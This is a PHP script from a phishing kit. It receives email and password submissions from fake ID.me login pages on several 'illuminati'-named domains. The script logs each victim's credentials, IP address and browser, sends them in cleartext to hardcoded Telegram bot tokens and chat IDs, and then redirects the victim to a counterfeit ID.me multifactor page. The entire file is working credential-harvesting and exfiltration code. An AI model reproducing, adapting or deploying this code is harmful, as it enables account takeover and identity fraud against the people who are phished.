<?php
// Force UTF-8 encoding from the start
header('Content-Type: text/html; charset=utf-8');
ob_start();

// Site-specific configuration with domain-based bots and redirects
$site_map = [
    '127.0.0.1' => [
        'bots' => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8413673524:AAGruDl1TxUDZH9RwQYYWSeEwJBcqR5S1lQ', 'chat_id' => '1566821522'],
        ],
        'redirect' => 'https://illuminatiofficial.world/index.html'
    ],
    
    'illuminatiofficial.world' => [
        'bots' => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8413673524:AAGruDl1TxUDZH9RwQYYWSeEwJBcqR5S1lQ', 'chat_id' => '1566821522'],
        ],
        'redirect' => 'https://illuminatiofficial.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html'
    ],
    
    'illuminatipath.world' => [
        "bots" => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8491692614:AAHhTPb4DRwkvmJa0SjF00v5x8kNWA82xfk', 'chat_id' => '6378885812'],
        ],
        "redirect" => "https://illuminatipath.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html"
    ],

    'illuminatisyndicate.world' => [
        "bots" => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8531352805:AAFN91n2L76y7WKwB159QFRNtvCnLu_uM9M', 'chat_id' => '7875523533'],
        ],
        "redirect" => "https://illuminatisyndicate.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html"
    ],

    'illuminatisacred.world' => [
        "bots" => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8412410845:AAFxuHUyafETE-8oCvUsSp45l0CtDkb-qm0', 'chat_id' => '7411482040'],
        ],
        "redirect" => "https://illuminatisacred.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html"
    ],
];

// ============================================
// BROWSER COMPATIBILITY FIXES
// ============================================

// Get the referring domain with browser-safe parsing
$referer = $_SERVER['HTTP_REFERER'] ?? '';
// Clean referer for safety
$referer = filter_var($referer, FILTER_SANITIZE_URL);
$parsed = parse_url($referer);
$domain = $parsed['host'] ?? 'unknown';

// Normalize domain (remove www. prefix for consistency)
$domain = str_replace('www.', '', $domain);

// Find the configuration for this domain
$config = $site_map[$domain] ?? null;

// If no config found, use a default one
if (!$config) {
    $config = reset($site_map);
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Setup log file with browser info
    $log_file = __DIR__ . "/logs/idme_logins.txt";
    if (!file_exists(dirname($log_file))) {
        mkdir(dirname($log_file), 0777, true);
    }

    // Enhanced logging with browser detection
    function log_entry($msg, $level = 'INFO') {
        global $log_file;
        $timestamp = date("Y-m-d H:i:s.u");
        $browser = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
        $browser_short = substr($browser, 0, 50);
        file_put_contents($log_file, "[$timestamp] [$level] [Browser: $browser_short] $msg\n", FILE_APPEND);
    }

    // Start timing
    $start_time = microtime(true);
    log_entry("=== Login Submission Started ===");

    // ============================================
    // BROWSER-COMPATIBLE FORM DATA HANDLING
    // ============================================
    
    // Handle different form encoding types
    $content_type = $_SERVER['CONTENT_TYPE'] ?? '';
    log_entry("Content-Type: $content_type");
    
    // Get form data with browser-compatible parsing
    $useremail = isset($_POST['useremail']) ? 
                htmlspecialchars(trim($_POST['useremail']), ENT_QUOTES, 'UTF-8') : 
                'Unknown';
    
    $userpassword = isset($_POST['userpassword']) ? 
                   htmlspecialchars(trim($_POST['userpassword']), ENT_QUOTES, 'UTF-8') : 
                   'Empty';
    
    $remember_me = isset($_POST['remember_me']) && $_POST['remember_me'] == 'true' ? 'Yes' : 'No';
    
    // Log form data received
    log_entry("Form data received - Email: [$useremail] | Password length: " . strlen($userpassword));

    // Get IP address with browser-compatible method
    $ip = 'unknown';
    $ip_sources = [
        'HTTP_CLIENT_IP',
        'HTTP_X_FORWARDED_FOR', 
        'HTTP_X_FORWARDED',
        'HTTP_FORWARDED_FOR',
        'HTTP_FORWARDED',
        'REMOTE_ADDR'
    ];
    
    foreach ($ip_sources as $source) {
        if (!empty($_SERVER[$source])) {
            $ip = $_SERVER[$source];
            break;
        }
    }
    
    // Handle multiple IPs
    if (strpos($ip, ',') !== false) {
        $ips = explode(',', $ip);
        $ip = trim($ips[0]);
    }

    $timestamp = date("Y-m-d H:i:s");
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    
    // Prepare Telegram message with browser-safe formatting
    $message = "🔐 *ID.me Login Submission*\n\n" .
               "📧 *Email:* `" . str_replace('`', '\`', $useremail) . "`\n" .
               "🔑 *Password:* `" . str_replace('`', '\`', $userpassword) . "`\n" .
               "💾 *Remember Me:* $remember_me\n" .
               "🌐 *Domain:* $domain\n" .
               "📡 *IP:* `$ip`\n" .
               "🕒 *Time:* $timestamp\n" .
               "🔍 *Browser:* " . substr($user_agent, 0, 100);

    // Log the submission immediately
    log_entry("[$domain] Login from $ip - Email: " . substr($useremail, 0, 50));

    // ============================================
    // BROWSER-COMPATIBLE TELEGRAM SENDING
    // ============================================
    
    // Create cURL multi handle for parallel processing
    $multi_handle = curl_multi_init();
    $handles = [];
    $success_count = 0;
    
    foreach ($config['bots'] as $bot_index => $bot) {
        if (empty($bot['token']) || empty($bot['chat_id'])) {
            log_entry("Skipping bot $bot_index - empty token or chat_id", 'WARN');
            continue;
        }
        
        $url = "https://api.telegram.org/bot" . $bot['token'] . "/sendMessage";
        
        // Browser-compatible POST data (URL-encoded for all browsers)
        $post_fields = http_build_query([
            'chat_id' => $bot['chat_id'],
            'text' => $message,
            'parse_mode' => 'Markdown',
            'disable_web_page_preview' => true
        ]);
        
        $ch = curl_init($url);
        
        // BROWSER-COMPATIBLE cURL settings
        curl_setopt_array($ch, [
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $post_fields,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 5,                    // Increased timeout for slower browsers
            CURLOPT_CONNECTTIMEOUT => 3,             // Connection timeout
            CURLOPT_SSL_VERIFYPEER => true,
            CURLOPT_SSL_VERIFYHOST => 2,
            CURLOPT_FORBID_REUSE => true,
            CURLOPT_FRESH_CONNECT => true,
            CURLOPT_NOSIGNAL => 1,
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1, // Use HTTP/1.1 for compatibility
            CURLOPT_ENCODING => '',                  // Empty for compatibility
            CURLOPT_HTTPHEADER => [
                'Content-Type: application/x-www-form-urlencoded; charset=utf-8',
                'Accept: application/json',
                'User-Agent: Telegram-Bot-API/1.0'
            ],
        ]);
        
        curl_multi_add_handle($multi_handle, $ch);
        $handles[$bot_index] = $ch;
    }
    
    // Execute all handles with browser-compatible timing
    $running = null;
    $start_curl = microtime(true);
    
    do {
        $status = curl_multi_exec($multi_handle, $running);
        if ($running) {
            // Longer timeout for browser compatibility
            curl_multi_select($multi_handle, 0.1); // 100ms
        }
        
        // Safety timeout (max 10 seconds total)
        if ((microtime(true) - $start_curl) > 10) {
            log_entry("cURL timeout reached, forcing completion", 'WARN');
            break;
        }
    } while ($running && $status == CURLM_OK);
    
    // Process results
    foreach ($handles as $bot_index => $ch) {
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $total_time = curl_getinfo($ch, CURLINFO_TOTAL_TIME);
        $error = curl_error($ch);
        
        if ($http_code == 200 && empty($error)) {
            $success_count++;
            log_entry("Bot $bot_index delivered in " . round($total_time, 3) . "s", 'SUCCESS');
        } else {
            log_entry("Bot $bot_index failed - HTTP $http_code: $error", 'ERROR');
        }
        
        curl_multi_remove_handle($multi_handle, $ch);
        curl_close($ch);
    }
    
    curl_multi_close($multi_handle);
    
    $end_time = microtime(true);
    $total_processing = round(($end_time - $start_time) * 1000, 2);
    
    log_entry("Telegram delivery: $success_count/" . count($config['bots']) . " bots | Total time: {$total_processing}ms", 'STATS');
    
    // ============================================
    // BROWSER-COMPATIBLE REDIRECT
    // ============================================
    
    // Clear output buffer completely
    while (ob_get_level()) {
        ob_end_clean();
    }
    
    // Browser-compatible headers
    header_remove('X-Powered-By');
    header_remove('Server');
    
    // Prevent caching
    header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
    header("Cache-Control: post-check=0, pre-check=0", false);
    header("Pragma: no-cache");
    header("Expires: 0");
    
    // Security headers for all browsers
    header("X-Content-Type-Options: nosniff");
    header("X-Frame-Options: DENY");
    header("Referrer-Policy: strict-origin-when-cross-origin");
    
    // JavaScript fallback for browsers that ignore headers
    $redirect_url = $config['redirect'];
    
    // Immediate redirect with JavaScript fallback
    header("Location: " . $redirect_url, true, 302);
    
    // HTML fallback for maximum compatibility
    echo '<!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="refresh" content="0;url=' . htmlspecialchars($redirect_url, ENT_QUOTES, 'UTF-8') . '">
        <title>Redirecting...</title>
        <script>
            // JavaScript redirect as backup
            window.location.href = "' . addslashes($redirect_url) . '";
        </script>
    </head>
    <body>
        <p>If you are not redirected, <a href="' . htmlspecialchars($redirect_url, ENT_QUOTES, 'UTF-8') . '">click here</a>.</p>
    </body>
    </html>';
    
    exit;
    
} else {
    // Not a POST request
    header("HTTP/1.1 405 Method Not Allowed", true, 405);
    header("Content-Type: text/plain; charset=utf-8");
    echo "This page only accepts POST submissions from the login form.";
    exit;
}
?>
